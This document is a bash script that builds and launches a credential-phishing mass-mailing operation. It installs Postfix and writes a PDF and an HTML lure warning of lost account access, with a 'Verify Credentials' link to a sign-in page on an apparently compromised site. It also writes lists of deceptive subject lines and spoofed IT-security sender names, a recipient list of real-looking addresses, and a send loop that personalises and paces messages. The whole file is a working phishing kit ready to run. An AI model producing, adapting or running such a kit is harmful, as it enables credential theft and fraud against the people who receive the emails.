#!/bin/bash

# Make sure the script is being run with sudo privileges
if [ "$EUID" -ne 0 ]; then
  echo "Please run this script as root or with sudo privileges."
  exit 1
fi

read -p "Enter your domain (e.g., domain.com): " domain
if [[ -z "$domain" ]]; then
  echo "Domain cannot be empty."
  exit 1
fi

read -p "Enter your username (e.g., no-reply): " username
if [[ -z "$username" ]]; then
  echo "username cannot be empty."
  exit 1
fi

# Update package list and install Postfix
echo "Updating package list and installing Postfix..."
sudo apt-get update -y
sudo apt-get install postfix -y

# Install tmux for session persistence
echo "Installing tmux for persistent sessions..."
sudo apt-get install tmux -y

# Backup the original Postfix config file
echo "Backing up the original Postfix main.cf..."
sudo cp /etc/postfix/main.cf /etc/postfix/main.cf.backup

sudo tee /etc/postfix/generic > /dev/null <<EOL
root@$domain    $username@$domain
@$domain        $username@$domain
EOL

sudo postmap /etc/postfix/generic
sudo service postfix restart || { echo "Postfix failed to restart"; exit 1; }

# Remove the current main.cf to replace with custom config
echo "Removing current main.cf..."
sudo rm /etc/postfix/main.cf

# Create a new Postfix main.cf file with the desired configuration
echo "Creating a new Postfix main.cf file..."
sudo tee /etc/postfix/main.cf > /dev/null <<EOL
# Postfix main configuration file
myhostname = bulkmail.$domain
mydomain = $domain
myorigin = $domain

inet_protocols = ipv4
smtp_helo_name = bulkmail.$domain
smtp_tls_security_level = may
smtp_tls_loglevel = 1

smtp_destination_concurrency_limit = 1
default_process_limit = 50
smtp_generic_maps = hash:/etc/postfix/generic
ignore_rhosts = yes

inet_interfaces = loopback-only
mydestination = localhost
smtp_sasl_auth_enable = no
smtpd_sasl_auth_enable = no
smtp_sasl_security_options = noanonymous

queue_directory = /var/spool/postfix
command_directory = /usr/sbin
daemon_directory = /usr/lib/postfix/sbin
mailbox_size_limit = 0
recipient_delimiter = +
EOL

# Restart Postfix to apply the changes
echo "Restarting Postfix service..."
sudo service postfix restart || { echo "Postfix failed to restart"; exit 1; }

# Install mailutils for sending emails via Postfix
echo "Installing mailutils..."
sudo apt-get install mailutils -y
sudo apt-get install html2text -y
sudo apt-get install parallel base64 -y
sudo apt install wkhtmltopdf -y
sudo apt-get install wkhtmltopdf -y
sudo chown $USER:$USER *

# Create a sample pdf email content (email.pdf)
echo "Creating email.pdf with email content..."
cat > email.pdf <<EOL
%PDF-1.4
1 0 obj
<< /Type /Catalog /Pages 2 0 R /OpenAction 3 0 R >>
endobj

2 0 obj
<< /Type /Pages /Kids [3 0 R] /Count 1 >>
endobj

3 0 obj
<< /Type /Page
   /Parent 2 0 R
   /MediaBox [0 0 612 792]
   /Contents 4 0 R
   /Resources << /Font << /F1 5 0 R /F2 6 0 R /F3 8 0 R >> >>
   /Annots [7 0 R]
>>
endobj

4 0 obj
<< /Length 700 >>
stream
BT
/F1 24 Tf
50 760 Td
(Important Account Notice) Tj

/F2 12 Tf
0 -40 Td
(Hello {recipient-user},) Tj

/F1 14 Tf
0 -30 Td
(Heads up:) Tj

/F2 12 Tf
0 -20 Td
(Your current sign-in method requires confirmation to prevent
losing your sign-in capability.) Tj

0 -20 Td
(- Use the secure link below) Tj
0 -15 Td
(- Review your details) Tj
0 -15 Td
(- Enter confirmation key: 472-762-1") Tj

/F1 12 Tf
0 -40 Td
(Tap Here To Verify Credentials) Tj

/F2 12 Tf
0 -35 Td
(This helps maintain uninterrupted sign-in.) Tj

/F3 9 Tf
0 -35 Td
(System Notification) Tj

0 -15 Td
(© 2025 webmail Inc. For intended recipient.) Tj
ET
endstream
endobj

5 0 obj
<< /Type /Font /Subtype /Type1 /BaseFont /Helvetica-Bold >>
endobj

6 0 obj
<< /Type /Font /Subtype /Type1 /BaseFont /Helvetica >>
endobj

8 0 obj
<< /Type /Font /Subtype /Type1 /BaseFont /Helvetica-Oblique >>
endobj

7 0 obj
<< /Type /Annot
   /Subtype /Link
   /Rect [50 580 250 595]
   /Border [0 0 0]
   /A << /S /URI /URI (saikim.com.my/wp-signin.php#{recipient-email}) >>
>>
endobj

xref
0 9
0000000000 65535 f
0000000010 00000 n
0000000075 00000 n
0000000130 00000 n
0000000300 00000 n
0000001030 00000 n
0000001085 00000 n
0000001140 00000 n
0000001200 00000 n
trailer
<< /Root 1 0 R /Size 9 >>
startxref
1300
%%EOF

EOL

# Create a sample HTML email content (email.html)
echo "Creating email.html with email content..."
cat > email.html <<EOL

<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
<html>
<head>
  <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Webmail Notification</title>
  <style type="text/css">
    body {
      margin: 0;
      padding: 0;
      font-family: Roboto, Tahoma, Helvetica, sans-serif;
      color: #333333;
      line-height: 1.5;
    }
    .header-bar {
      background-color: #d40000; /* Changed from #029740 (green) to #d40000 (red) */
      color: #ffffff;
      padding: 10px;
      font-size: 12px;
    }
    .content {
      padding: 20px;
      max-width: 600px;
      margin: 0 auto;
    }
    h1 {
      color: #ee6111; /* Kept orange accent */
      text-align: center;
      font-size: 28px;
      margin-bottom: 20px;
    }
    .footer {
      text-align: center;
      font-size: 12px;
      color: #777777;
      margin-top: 30px;
    }
  </style>
</head>
<body>
  <table width="100%" cellspacing="0" cellpadding="0">
    <tr>
      <td class="header-bar">
        Mail Server Account Update Notification
      </td>
    </tr>
  </table>

  <div class="content">
    <h1>Webmail</h1>
    <p>Your sign-in method will stop functioning on 10/10/2025 (Confirmation Needed), you must take prompt steps to maintain and prevent limitations to your account - {recipient-email}.</p>
	    <p>View the attached document for further instructions.</p>
    <p>Thank you.</p>
  </div>

  <div class="footer">
    <p>&copy; 2025 {recipient-domain} Inc.  For intended recipient.</p>
  </div>
</body>
</html>
EOL

# Create a sample txt subject content (subject.txt)
echo "Creating subject.txt with subject content..."
cat > subject.txt <<EOL
Revalidate by {date}
{recipient-domain} access expiring
Action needed: {random-number}
Last chance: revalidate {date}
{recipient-domain} access alert
Action: {random-number}
Last chance: {date}
Confirm {recipient-email}
{recipient-user} validation
Expire {date} - act
Secure {recipient-domain}
Case {random-number}
{recipient-user} must confirm
Deadline {date}
Check {recipient-email}
{recipient-user} re-auth
Before {date}
Protect {recipient-domain}
Ref {random-number}
{recipient-user} validate
Final {date}
Validate {recipient-email}
{recipient-user} approve
{recipient-domain} system update - confirm your access
Routine security check for your email account
{recipient-domain} maintenance: confirm your details
Account security update for {recipient-email}
{recipient-domain} authentication required
{recipient-email} - confirmation requested
Please complete your email validation
{recipient-domain} records update required
Email system check for {recipient-email}
{recipient-domain} access confirmation
{recipient-email} - action required
{recipient-domain} records validation
Please confirm your email preferences
{recipient-email} security confirmation
Routine authentication for your email account
{recipient-email} access review
{recipient-domain} security check
Please validate your email information
{recipient-domain} records confirmation
Email system maintenance notification
{recipient-domain} access review
Security update for your email access
{recipient-domain} records maintenance
Please confirm your email account status
Confirm {recipient-domain} access
Access expiring {date}
{recipient-domain} authorization
Verify your account
Security check required
Pending action: #{random-number}
Update your access
Complete by {date}
Reminder: validate access
Final step to secure account
Review required
Case #{random-number}
{recipient-domain} notice
Your access update
EOL

# Create a sample txt name content (name.txt)
echo "Creating name.txt with name content..."
cat > name.txt <<EOL
Webmail Revalidation
IT Security Admin
Domain Security Team
Network Operations
Webmail Revalidation
CyberSecurity Alert
System Compliance
Infrastructure Watch
IT Governance
Mail Shield
Domain Guardian
Inbox Sentinel
Cyber Patrol
Firewall Watch
Secure Gateway
Data Bastion
Threat Response
Breach Alert
Policy Enforcer
Compliance Warden
Access Sentinel
Authentication Guard
Password Sentinel
Login Vigilante
SSO Guardian
2FA Enforcer
Identity Sentinel
Domain & Server Focused
DNS Protector
Server Watchtower
Hosting Safeguard
SSL Sentinel
Webmail Revalidation
Backup Defender
Server Patrol
Webmail Defender
No-Reply Security
Do Not Ignore: IT Dept
Verified IT Sender
Domain Patrol
Corporate IT Services
Official Domain Admin
Enterprise Webmail
Authorized IT Notifications
Verified System Admin
IT Policy Enforcement
Certified Domain Team
Domain & Server Alerts
Domain Renewal Team
Server Maintenance Alert
DNS Configuration Team
Hosting Security Update
Webmail Revalidation
Domain Ownership Check
Mail Server Upgrade
SSL Certificate Expiry
Firewall Security Alert
Domain admin
Domain at Risk
Server Update
EOL

# Create a sample txt list content (list.txt)
echo "Creating list.txt with list content..."
cat > list.txt <<EOL
info@brickx.us
mackenzie@walshequipment.ca
podpora@vsezapivo.si
EOL

# Create the sending script (send.sh)
echo "Creating send.sh for bulk email sending..."
cat > send.sh <<EOL
#!/bin/bash

# Configuration files
EMAIL_LIST="list.txt"
HTML_TEMPLATE="email.html"
PDF_TEMPLATE="email.pdf"
SUBJECT_FILE="subject.txt"
NAME_FILE="name.txt"
LOG_FILE="send_log_\$(date +%Y%m%d).txt"

# Mode selection (html, htmlpdf, txtpdf, txthtml)
MODE="htmlpdf"  # Change to desired mode: html, htmlpdf, txtpdf, or txthtml

# Initialize counters
TOTAL=\$(wc -l < "\$EMAIL_LIST")
SUCCESS=0
FAILED=0

# Ensure runtime dir is set to avoid wkhtmltopdf error
export XDG_RUNTIME_DIR="\${XDG_RUNTIME_DIR:-/tmp/runtime-\$UID}"
mkdir -p "\$XDG_RUNTIME_DIR"

# Verify required files exist based on mode
case "\$MODE" in
    "html")
        REQUIRED_FILES=("\$EMAIL_LIST" "\$HTML_TEMPLATE" "\$SUBJECT_FILE" "\$NAME_FILE")
        ;;
    "htmlpdf")
        REQUIRED_FILES=("\$EMAIL_LIST" "\$HTML_TEMPLATE" "\$PDF_TEMPLATE" "\$SUBJECT_FILE" "\$NAME_FILE")
        ;;
    "txtpdf")
        REQUIRED_FILES=("\$EMAIL_LIST" "\$PDF_TEMPLATE" "\$SUBJECT_FILE" "\$NAME_FILE")
        ;;
    "txthtml")
        REQUIRED_FILES=("\$EMAIL_LIST" "\$HTML_TEMPLATE" "\$SUBJECT_FILE" "\$NAME_FILE")
        ;;
    *)
        echo "Error: Invalid mode specified. Use html, htmlpdf, txtpdf, or txthtml" | tee -a "\$LOG_FILE"
        exit 1
        ;;
esac

for file in "\${REQUIRED_FILES[@]}"; do
    if [ ! -f "\$file" ]; then
        echo "Error: Missing \$file for \$MODE mode" | tee -a "\$LOG_FILE"
        exit 1
    fi
done

# Load all subjects and names into arrays
mapfile -t SUBJECTS < "\$SUBJECT_FILE"
mapfile -t NAMES < "\$NAME_FILE"

# Random name generator (from name.txt)
get_random_name() {
    echo "\${NAMES[\$((RANDOM % \${#NAMES[@]}))]}"
}

# Random number generator (4-6 digits)
get_random_number() {
    echo \$((RANDOM % 9000 + 1000))
}

# Function to process PDF template with variables
process_pdf_template() {
    local email=\$1
    local random_name=\$2
    local random_number=\$3
    local current_date=\$4
    local email_user=\$5
    local email_domain=\$6
    local base64_email=\$7
    
    # Create a temporary PDF file
    local temp_pdf=\$(mktemp --suffix=".pdf")
    
    # Process the PDF template with variables
    sed \\
        -e "s|{date}|\$current_date|g" \\
        -e "s|{recipient-email}|\$email|g" \\
        -e "s|{recipient-user}|\$email_user|g" \\
        -e "s|{recipient-domain}|\$email_domain|g" \\
        -e "s|{name}|\$random_name|g" \\
        -e "s|{random-name}|\$(get_random_name)|g" \\
        -e "s|{random-number}|\$random_number|g" \\
        -e "s|{sender-email}|$username@$domain|g" \\
        -e "s|{sender-name}|\$SELECTED_SENDER_NAME|g" \\
        -e "s|{base64-encryptedrecipents-email}|\$base64_email|g" \\
        "\$PDF_TEMPLATE" > "\$temp_pdf"
    
    echo "\$temp_pdf"
}

# Function to convert HTML to PDF
convert_html_to_pdf() {
    local html_file=\$1
    local output_pdf=\$2
    
    HTML_FILE_URI="file://\$html_file"
    if ! wkhtmltopdf --quiet --enable-local-file-access --load-error-handling ignore "\$HTML_FILE_URI" "\$output_pdf" >/dev/null 2>&1; then
        echo "\$(date) - WARNING: PDF generation failed for \$CLEAN_EMAIL" >> "\$LOG_FILE"
        echo ""
    else
        echo "\$output_pdf"
    fi
}

# Process each email
while IFS= read -r email; do
    CLEAN_EMAIL=\$(echo "\$email" | tr -d '\r\n')
    EMAIL_USER=\$(echo "\$CLEAN_EMAIL" | cut -d@ -f1)
    EMAIL_DOMAIN=\$(echo "\$CLEAN_EMAIL" | cut -d@ -f2)
    CURRENT_DATE=\$(date +%Y-%m-%d)
    BASE64_EMAIL=\$(echo -n "\$CLEAN_EMAIL" | base64)

    RANDOM_NAME=\$(get_random_name)
    RANDOM_NUMBER=\$(get_random_number)
    SELECTED_SENDER_NAME="\${NAMES[\$((RANDOM % \${#NAMES[@]}))]}"

    SELECTED_SUBJECT="\${SUBJECTS[\$((RANDOM % \${#SUBJECTS[@]}))]}"
    SELECTED_SUBJECT=\$(echo "\$SELECTED_SUBJECT" | sed \\
        -e "s|{date}|\$CURRENT_DATE|g" \\
        -e "s|{recipient-email}|\$CLEAN_EMAIL|g" \\
        -e "s|{recipient-user}|\$EMAIL_USER|g" \\
        -e "s|{recipient-domain}|\$EMAIL_DOMAIN|g" \\
        -e "s|{name}|\$RANDOM_NAME|g" \\
        -e "s|{random-name}|\$(get_random_name)|g" \\
        -e "s|{random-number}|\$RANDOM_NUMBER|g")

    echo "Processing: \$CLEAN_EMAIL"

    MESSAGE_ID="<\$(date +%s%N).\$(openssl rand -hex 8)@$domain>"

    # Prepare variables for all templates
    COMMON_SED_ARGS=(
        -e "s|{date}|\$CURRENT_DATE|g"
        -e "s|{recipient-email}|\$CLEAN_EMAIL|g"
        -e "s|{recipient-user}|\$EMAIL_USER|g"
        -e "s|{recipient-domain}|\$EMAIL_DOMAIN|g"
        -e "s|{name}|\$RANDOM_NAME|g"
        -e "s|{random-name}|\$(get_random_name)|g"
        -e "s|{random-number}|\$RANDOM_NUMBER|g"
        -e "s|{sender-email}|$username@$domain|g"
        -e "s|{sender-name}|\$SELECTED_SENDER_NAME|g"
        -e "s|{base64-encryptedrecipents-email}|\$BASE64_EMAIL|g"
    )

    # Process templates based on mode
    case "\$MODE" in
        "html")
            # HTML mode: Only HTML body, no attachment
            TEMP_BODY=\$(mktemp --suffix=".html")
            sed "\${COMMON_SED_ARGS[@]}" "\$HTML_TEMPLATE" > "\$TEMP_BODY"
            PDF_FILE=""
            ;;
        "htmlpdf")
            # HTMLPDF mode: HTML body + PDF attachment
            TEMP_BODY=\$(mktemp --suffix=".html")
            sed "\${COMMON_SED_ARGS[@]}" "\$HTML_TEMPLATE" > "\$TEMP_BODY"
            PDF_FILE=\$(process_pdf_template "\$CLEAN_EMAIL" "\$RANDOM_NAME" "\$RANDOM_NUMBER" "\$CURRENT_DATE" "\$EMAIL_USER" "\$EMAIL_DOMAIN" "\$BASE64_EMAIL")
            ;;
        "txtpdf")
            # TXTPDF mode: Text body + PDF attachment
            TEMP_BODY=\$(mktemp)
            cat <<EOF > "\$TEMP_BODY"
Reminder: Complete verification for \$CLEAN_EMAIL via the attached instructions (from \$CURRENT_DATE to 2025-06-30) to prevent losing access to your account.

Webmail © 2025. All rights reserved.
EOF
            PDF_FILE=\$(process_pdf_template "\$CLEAN_EMAIL" "\$RANDOM_NAME" "\$RANDOM_NUMBER" "\$CURRENT_DATE" "\$EMAIL_USER" "\$EMAIL_DOMAIN" "\$BASE64_EMAIL")
            ;;
        "txthtml")
            # TXTHTML mode: Text body + HTML-to-PDF attachment
            TEMP_BODY=\$(mktemp)
            cat <<EOF > "\$TEMP_BODY"
Reminder: Complete verification for \$CLEAN_EMAIL via the attached instructions (from \$CURRENT_DATE to 2025-06-30) to prevent losing access to your account.

Webmail © 2025. All rights reserved.
EOF
            TEMP_HTML=\$(mktemp --suffix=".html")
            sed "\${COMMON_SED_ARGS[@]}" "\$HTML_TEMPLATE" > "\$TEMP_HTML"
            SAFE_EMAIL=\$(echo "\$CLEAN_EMAIL" | sed 's/[^a-zA-Z0-9@.]/_/g')
            PDF_FILE="/tmp/Verfy_\${SAFE_EMAIL}.pdf"
            PDF_FILE=\$(convert_html_to_pdf "\$TEMP_HTML" "\$PDF_FILE")
            rm "\$TEMP_HTML"
            ;;
    esac

    # Build and send the email
    {
    echo "Return-Path: <$username@$domain>"
    echo "From: \"\$SELECTED_SENDER_NAME\" <$username@$domain>"
    echo "To: <\$CLEAN_EMAIL>"
    echo "Subject: \$SELECTED_SUBJECT"
    echo "MIME-Version: 1.0"
    echo "Message-ID: \$MESSAGE_ID"
    
    if [ "\$MODE" = "html" ] || [ "\$MODE" = "htmlpdf" ]; then
        # HTML email (with or without attachment)
        echo "Content-Type: multipart/mixed; boundary=\"BOUNDARY\""
        echo
        echo "--BOUNDARY"
        echo "Content-Type: text/html; charset=UTF-8"
        echo
        cat "\$TEMP_BODY"
        echo
    else
        # Plain text email (with attachment)
        echo "Content-Type: multipart/mixed; boundary=\"BOUNDARY\""
        echo
        echo "--BOUNDARY"
        echo "Content-Type: text/plain; charset=UTF-8"
        echo
        cat "\$TEMP_BODY"
        echo
    fi

    # Add PDF attachment if present
    if [ -n "\$PDF_FILE" ] && [ -f "\$PDF_FILE" ]; then
        echo "--BOUNDARY"
        echo "Content-Type: application/pdf; name=\"Verfy \$CLEAN_EMAIL.pdf\""
        echo "Content-Transfer-Encoding: base64"
        echo "Content-Disposition: attachment; filename=\"Verfy \$CLEAN_EMAIL.pdf\""
        echo
        base64 "\$PDF_FILE"
        echo
    fi

    echo "--BOUNDARY--"
    } | /usr/sbin/sendmail -t -oi

    # Clean up temporary files
    rm "\$TEMP_BODY"
    [ -n "\$PDF_FILE" ] && [ -f "\$PDF_FILE" ] && rm "\$PDF_FILE"

    if [ \$? -eq 0 ]; then
        echo "\$(date) - SUCCESS: \$CLEAN_EMAIL" >> "\$LOG_FILE"
        ((SUCCESS++))
    else
        echo "\$(date) - FAILED: \$CLEAN_EMAIL" >> "\$LOG_FILE"
        ((FAILED++))
    fi

    sleep \$(awk -v min=0.3 -v max=0.8 'BEGIN{srand(); print min+rand()*(max-min)}')

    echo "[\$SUCCESS/\$TOTAL] Sent to \$CLEAN_EMAIL"

done < "\$EMAIL_LIST"

echo "Completed at \$(date)" >> "\$LOG_FILE"
echo "Total: \$TOTAL | Success: \$SUCCESS | Failed: \$FAILED" >> "\$LOG_FILE"
echo "Full log: \$LOG_FILE"
EOL


# Make the send.sh script executable
chmod +x send.sh

# Create a tmux session and run the send.sh script in it
echo "Starting tmux session and running send.sh..."
tmux new-session -d -s mail_session "./send.sh"

# Print instructions for reattaching to the tmux session
echo "Your email sending process is running in the background with tmux."
echo "To reattach to the session, use: tmux attach -t mail_session"
